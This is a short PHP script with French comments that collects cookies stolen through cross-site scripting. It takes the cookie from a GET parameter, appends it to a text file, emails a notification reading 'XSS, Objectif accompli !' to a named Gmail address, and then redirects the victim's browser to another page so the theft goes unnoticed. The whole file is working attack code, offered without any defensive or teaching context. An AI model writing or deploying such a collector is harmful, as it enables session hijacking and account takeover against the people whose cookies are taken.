
<?php
$cookie = $_GET["c"]; // on reconna�t c en variable GET
if($cookie)
{
        $fp = fopen("cookies.txt","a");
        fputs($fp,$cookie . "\r\n"); 
        fclose($fp);
		@mail('p.chauvelin@gmail.com', 'XSS', 'Objectif accompli !');
		sleep(3);
}

?>

<script>
location.replace("http://caaa.fr/memoire/page.php");
</script>